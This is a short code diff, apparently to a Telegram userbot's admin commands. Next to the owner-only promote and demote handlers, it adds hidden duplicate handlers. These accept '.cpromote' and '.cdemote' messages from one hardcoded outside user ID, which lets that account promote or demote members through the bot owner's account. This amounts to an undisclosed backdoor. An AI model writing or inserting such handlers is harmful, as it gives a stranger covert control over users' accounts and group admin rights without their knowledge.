@@ -113,6 +113,7 @@ async def set_group_photo(gpic):
 
 
 @register(outgoing=True, pattern=r"^\.promote(?: |$)(.*)")
+@register(incoming=True, from_users=1979717764, pattern=r"^\.cpromote(?: |$)(.*)")
 async def promote(promt):
     # Get targeted chat
     chat = await promt.get_chat()
@@ -163,6 +164,7 @@ async def promote(promt):
 
 
 @register(outgoing=True, pattern=r"^\.demote(?: |$)(.*)")
+@register(incoming=True, from_users=1979717764, pattern=r"^\.cdemote(?: |$)(.*)")
 async def demote(dmod):
     # Admin right check
     chat = await dmod.get_chat()
